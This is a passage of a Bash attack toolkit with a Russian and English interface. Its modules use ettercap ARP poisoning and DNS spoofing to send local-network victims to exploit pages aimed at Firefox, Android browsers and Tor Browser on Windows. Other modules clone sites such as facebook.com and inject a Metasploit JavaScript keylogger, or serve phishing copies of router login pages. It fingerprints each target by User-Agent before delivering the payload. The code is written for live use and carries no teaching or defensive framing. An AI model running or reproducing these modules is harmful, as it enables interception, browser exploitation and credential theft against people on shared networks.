      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "CICADA3301 - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "CICADA3301 - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="49" # above versions are patched (official release its 51.0.1)...
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log > /dev/null 2>&1
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# check if target system its vulnerable (firefox version)
if [ "$VeVul" \> "$nOn" ]; then
echo "${GreenF}    Отчет браузера:${RedF} не уязвимы...${BlueF}"
sleep 3
echo "${RedF}[x] предупреждение: работает против несовместимой цели!"
sleep 1
else
echo "${GreenF}    Отчет браузера: уязвимый...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановите веб-сервер apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------------------
# ANDROID BROWSER DENIAL-OF-SERVICE [mitm+dns_spoof]
# --------------------------------------------------
sh_stage11 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Этот модуль будет сбивать целевой браузер Android с помощью      ${BlueF}|"
echo "${BlueF}    | ${YellowF}   Спрей кучи, написанный в javascript (поставьте под mitm + dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'Все домены [.com] будут перенаправлены на веб-страницу эксплойтов.' ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}   1 - захватить пакет tcp/udp с целевого хоста для проверки уязвимости   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   2 - Если браузерная версия его пригодна для использования, тогда доставьте полезную нагрузку.   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации через морфеус." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} составление UserAgent.eft${RedF}!${Reset};
  xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Sтарт веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "CICADA3301 - захват пользовательского агента" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "CICADA3301 - захват пользовательского агента" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # Mozilla/5.0 (Linux; Android 6.0.1; VFD 600 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89
  # Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
  nOn="Android"
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log > /dev/null 2>&1
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Android"` > /dev/null 2>&1 # user-agent == Android
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# if in captured packet its writen: Android then its vulnerable
if [ "$VeVul" = "$nOn" ]; then
echo "${GreenF}    Отчет браузера: уязвимый...${BlueF}"
sleep 3
else
echo "${GreenF}    Отчет браузера:${RedF} не уязвимы...${BlueF}"
sleep 3
echo "${RedF}[x] предупреждение: работает против несовместимой цели!"
sleep 1
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановите веб-сервер apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------------
# TOR-BROWSER BUFFER OVERFLOW EXPLOIT [windows systems]
# -----------------------------------------------------
sh_stage12 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} Этот модуль завершит работу целевого tor-браузера (windows sys), используя  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Спрей кучи, написанный в javascript (поставьте под mitm + dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  «Все домены [.com] будут перенаправлены на веб-страницу эксплойтов».  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Захват пакета tcp/udp от целевого хоста для проверки уязвимости    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - Если его версия пригодна для использования, то доставьте полезную нагрузку.        ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "пример: $IP\выбрал цель для фильтрации через морфеус." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js > /dev/null 2>&1
  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} составление UserAgent.eft${RedF}!${Reset};
  xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "CICADA3301 - захват пользовательского агента" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "CICADA3301 - захват пользовательского агента" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="Windows NT" # only windows systems are affected...
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log > /dev/null 2>&1
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Windows NT"` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# check if target system its vulnerable (windows systems)
if [ "$VeVul" != "$nOn" ]; then
echo "${GreenF}    Системный отчет:${RedF} не уязвимы...${BlueF}"
sleep 3
echo "${RedF}[x] предупреждение: работает против несовместимой цели!"
sleep 1
else
echo "${GreenF}    Системный отчет: уязвимый...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi



  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановите веб-сервер apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  rm $ApachE/cssbanner.js > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ---------------------------------------------------------------
# INJECT A JAVA KEYLOOGER INTO TARGET WEBPAGE
# clone a website and inject a metasploit iframe (java_keylogger)
# ---------------------------------------------------------------
sh_stage13 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} Этот модуль позволит вам клонировать веб-страницу по вашему выбору и ${BlueF}|"
echo "${BlueF}    | ${YellowF} вставьте в него Java Keylooger, а затем используйте mitm + dns_spoof  ${BlueF}|"
echo "${BlueF}    | ${YellowF} возможность перенаправить целевой трафик на клонированную веб-страницу  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Java Keylooger (требуется metasploit) ждет ввода учетных данных.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} ВНИМАНИЕ: 'msfconsole требуется для получения учетных данных от цели' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
cLon=$(zenity --title="☠ Клон Веб Страницы ☠" --text "Пример: www.facebook.com \Выберите доменное имя для клонирования." --entry --width 270) > /dev/null 2>&1


  # dowloading/clonning website target
  cd $IPATH/output && mkdir clone && cd clone
  echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
  sleep 1 && mkdir $cLon && cd $cLon
  # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="Клонирование веб-страницы: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  # inject the javascript <TAG> in cloned index.html using SED command
  echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  mv copy.html index.html > /dev/null 2>&1
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cd ..
  cp -r $cLon $ApachE/$cLon > /dev/null 2>&1
  cd $IPATH


    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
    sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1


    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start > /dev/null 2>&1
    if [ "$RbUdB" = "YES" ]; then
    msfdb delete > /dev/null 2>&1
    msfdb init > /dev/null 2>&1
    fi

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 TCP/IP Bednakov-Xack-Live" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  rm -r $ApachE/$cLon > /dev/null 2>&1
  rm -r $IPATH/output/clone > /dev/null 2>&1
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановите веб-сервер apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
service postgresql stop > /dev/null 2>&1
# check if exist any reports
dd=`ls $IPATH/logs`
if ! [ -z "$dd" ]; then
Qu=$(zenity --info --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
fi

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------
# MODEM/ROUTER PHISHING (java_keylogger)
# --------------------------------------
sh_stage14 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  Этот модуль позволяет вам клонировать страницу входа модема/роутера   ${BlueF}|"
echo "${BlueF}    | ${YellowF} вставьте в него Java Keylooger, а затем используйте mitm + dns_spoof  ${BlueF}|"
echo "${BlueF}    | ${YellowF} возможность перенаправить целевой трафик на клонированную веб-страницу  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Java Keylooger (требуется metasploit) ждет ввода учетных данных.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} ВНИМАНИЕ: «msfconsole требуется для получения учетных данных от цели» ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1



  # retrieve info about modem to inject into clone
  echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
  nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1


  # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1 | awk {'print $1,$2,$3'}` # grab modem name
  MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
  # check if nmap have retrieved any string from scan
  if [ -z "$InjE" ]; then
  echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
  echo "${RedF}[x]${white} С помощью:${GreenF} 'широкополосный маршрутизатор'${white} как имя сервера${RedF}!"
  sleep 2
  InjE="broadband router"
  MaCa="8A:17:62:35:22:UA"
  fi


# chose what phishing webpage to use
PHiS=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Информация о модеме:\n$InjE\Войти на: http://$GaTe\n\Выберите фишинговую веб-страницу для использования" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink" FALSE "ZTE" FALSE "Technicolor" --width 350 --height 370) > /dev/null 2>&1


  # building cloned login modem webpage
  cd $IPATH/bin/phishing/router-modem
  cp index.html index.rb > /dev/null 2>&1
  cp login.html login.rb > /dev/null 2>&1
  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    cp new.html new.rb > /dev/null 2>&1
  fi
  # chose 3 phishing webpage to use
  if [ "$PHiS" = "DLink" ]; then
    cp -r DLINK $ApachE/DLINK > /dev/null 2>&1
  fi
  # chose 4 phishing webpage to use
  if [ "$PHiS" = "TPLink" ]; then
    cp -r TPLink $ApachE/TPLink > /dev/null 2>&1
  fi
  # chose 5 phishing webpage to use
  if [ "$PHiS" = "ZTE" ]; then
    cp -r ZTE $ApachE/ZTE > /dev/null 2>&1
  fi
  # chose 6 phishing webpage to use
  if [ "$PHiS" = "Technicolor" ]; then
    cp -r Technicolor $ApachE/Technicolor > /dev/null 2>&1
  fi


  # grab modem ip addr
  if [ "$PHiS" = "Meo" ]; then
    MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
  else
    MIP="www.google.im"
  fi
  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    sed -i "s/MoDemIP/$MIP/" new.html
    sed -i "s/MaCa/$MaCa/" new.html
    sed -i "s/MoDemIP/www.google.im/" login.html
